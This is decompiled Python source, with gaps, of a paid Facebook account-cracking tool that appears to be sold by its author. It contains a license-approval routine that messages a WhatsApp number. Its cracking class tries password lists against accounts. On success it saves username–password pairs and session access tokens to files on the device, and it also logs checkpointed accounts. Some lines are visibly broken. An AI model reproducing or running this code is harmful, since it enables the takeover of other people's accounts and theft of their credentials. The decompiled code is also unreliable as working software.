# Decompile by Mr-Hacker
# Time Succes decompile : 2022-07-31 16:04:44.824325
...
def main_apv():
    ...
    try:
        ...
        tks = ('SALAM%20JUTTBRAND%20BRO%20!%20PLEASE%20APPROVE%20My%20KEY%20The%20KEY%20Is%20:%20'+ak+key1);os.system('am start https://wa.me/+97696784016?text='+tks)
        main_apv()
    r1=requests.get("https://github.com/JUTTBRAND/AWAIS-BRAND/blob/main/Approval.txt").text
    if key1 in r1:
        MOHSIN()
    else:
        os.system("clear")
        ...
        print ("")
        input(' \t\033[1;92m    Press Enter To Buy this Tool')
        tks = ('SALAM%20JUTTBRAND%20BRO%20!%20PLEASE%20APPROVE%20My%20KEY%20The%20KEY%20Is%20:%20'+ak+key1);os.system('am start https://wa.me/+97696784016?text='+tks);main_apv()
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;92m [JUTTBRAND] %s/%s  \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[AWAIS-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/AWAIS_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				open('/sdcard/ids/tokens.txt','a').write(access+'\n')
				follow_id='100007061760822'
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[MOHSIN-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahn(user)))
					wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahn(user))
					cp.append(wrt)
					open('/sdcard/AWAIS_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;92m[AWAIS-OK] %s | %s%s      ' % (user,pw,tahun(user)))
...
banner = """      
 ...
 TOOL TYPE [ PAID] VALIDITY [ 30 DAYS] CHARGES [400]
==================================================
   AUTHOR   :  AWAIS TAHIR
   GITHUB.   : JUTTBRAND
 VERSION.  :.  1.0.3
==================================================           
              \x1b[1;41m\x1b[1;97mUSE METHOD 2 ALWAYS \x1b[1;0m"""
ct = datetime.now()
n = ct.month
